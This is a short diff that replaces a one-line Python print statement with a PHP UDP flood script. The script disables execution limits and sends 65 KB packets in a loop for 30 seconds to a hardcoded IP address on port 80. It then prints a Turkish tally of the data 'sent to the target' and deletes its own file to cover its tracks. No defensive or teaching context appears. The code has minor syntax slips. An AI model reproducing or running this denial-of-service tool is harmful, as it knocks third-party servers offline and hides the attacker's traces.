@@ -1,1 +1,24 @@
-print("fuckerman")
+$packets = 0;
+ignore_user_abort(TRUE);
+set_time_limit(0);
+$exec_time = "30"
+$time = time();
+$max_time = $time+$exec_time;
+$host = "173.249.9.150"
+for($i=0;$i<65553;$i++){
+$out .= 'X';
+}
+while(1){
+$packets++;
+if(time() > $max_time){
+break;
+}
+$rand = rand(1,65553);
+$fp = fsockopen('udp://'.$host, 80, $errno, $errstr, 30);
+if($fp){
+fwrite($fp, $out);
+fclose($fp);
+}
+}
+echo '<br>' . round($packets / $exec_time, 2) . " saniyede $packets (" . round(($packets * 65) / 1024, 2) . " MB) veri hedefe yollandi";
+unlink(__FILE__);
